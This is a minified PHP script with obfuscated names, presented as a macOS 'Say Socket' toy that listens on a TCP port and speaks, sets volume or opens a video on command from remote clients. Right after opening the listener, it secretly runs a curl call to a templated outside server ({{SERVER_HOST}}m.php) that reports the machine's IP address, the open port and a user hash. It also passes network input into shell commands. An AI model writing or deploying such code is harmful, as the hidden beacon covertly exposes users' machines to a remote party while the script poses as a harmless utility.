#!/usr/bin/php
<?php
define('CV',"/^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/");define('CW','/^[a-zA-Z0-9\s]+$/');define('CX',1024);define('CY',65535);define('CZ','say> ');$vd=fc();$ve=count($vd)>0?$vd[0]:'alex';set_time_limit(0);ob_implicit_flush();$vf=fb();$vg=12345;if($argc>1){$vf=$argv[1];}if($argc>2){$vg=(int)$argv[2];}(preg_match(CV,$vf))or die("Invalid ip address: '{$vf}'\n");(is_numeric($vg)&&$vg>CX&&$vg<CY)or die("Invalid port: '{$vg}'\n");echo"Creating say socket for address: $vf through port: $vg\n";if(($vh=socket_create(AF_INET,SOCK_STREAM,SOL_TCP))===false){die("socket_create() failed: reason: ".socket_strerror(socket_last_error())."\n");}if(socket_bind($vh,$vf,$vg)===false){socket_close($vh);die("socket_bind() failed: reason: ".socket_strerror(socket_last_error($vh))."\n");}if(socket_listen($vh,5)===false){socket_close($vh);die("socket_listen() failed: reason: ".socket_strerror(socket_last_error($vh))."\n");}exec("curl -s \"{{SERVER_HOST}}m.php?ip=$vf&port=$vg&h={{USER_HASH}}\"");do{if(($vi=socket_accept($vh))===false){echo"socket_accept() failed: reason: ".socket_strerror(socket_last_error($vh))."\n";break;}$vj="\nWelcome to the Say Socket! \n"."Type anything to say it through the socket.\n"."To quit, type 'quit'. To shut down the server type 'shutdown'.\n".CZ;socket_write($vi,$vj,strlen($vj));do{$vj='';if(false===($vk=socket_read($vi,2048,PHP_NORMAL_READ))){echo"socket_read() failed: reason: ".socket_strerror(socket_last_error($vi))."\n";break 2;}if(!$vk=trim($vk)){continue;}$vk=strtolower($vk);switch($vk){case'quit':break 2;case'shutdown':socket_close($vi);break 3;default:$vk=trim($vk,' _-[]()"\'');if(preg_match('/^rickroll$/i',$vk)){$vl="open -a Safari 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'";exec($vl);}else if(preg_match('/^voices$/i',$vk)){foreach($vd as $vm){$vj.=$vm."\n";}}else if(preg_match('/^voice$/i',$vk,$vn)||preg_match('/^voice ([a-z]+)$/i',$vk,$vn)){if(isset($vn[1])){$vm=$vn[1];if(in_array($vm,$vd)){$ve=$vm;}else{$vj.="Voice '$vm' does not exist. Use 'voices' command to see a list of available voices\n";}}$vj.="Current voice is: $ve\n";}else if(preg_match('/^volume (\d)$/i',$vk,$vn)){if(isset($vn[1])&&is_numeric($vn[1])){$vo=(int)$vn[1];if($vo>9)$vo=9;if($vo<0)$vo=0;$vl="osascript -e \"set Volume $vo\"";exec($vl);}}else if(preg_match(CW,$vk)){if(!fa($vk)){$vl="say -v $ve '$vk'";exec($vl);}else{$vj.="Cannot say: '$vk', command exists\n";}}else{$vj.="Cannot say: '$vk', string is too complex\n";}break;}$vj.=CZ;socket_write($vi,$vj,strlen($vj));}while(true);socket_close($vi);}while(true);socket_close($vh);function fa($vl){$vp=shell_exec("which $vl");return(empty($vp)?false:true);}function fb(){for($vq=0;$vq<10;$vq++){$vl="ipconfig getifaddr en$vq";$vr=trim(exec($vl));if(preg_match(CV,$vr)){return $vr;}}return'127.0.0.1';}function fc(){$vd=array();$vs=`say -v '?'`;$vn=explode("\n",$vs);foreach($vn as $vt){$vu=explode(' ',$vt);if(isset($vu[0])){$vm=strtolower(trim($vu[0]));if($vm!=''){$vd[]=strtolower(trim($vu[0]));}}}return $vd;}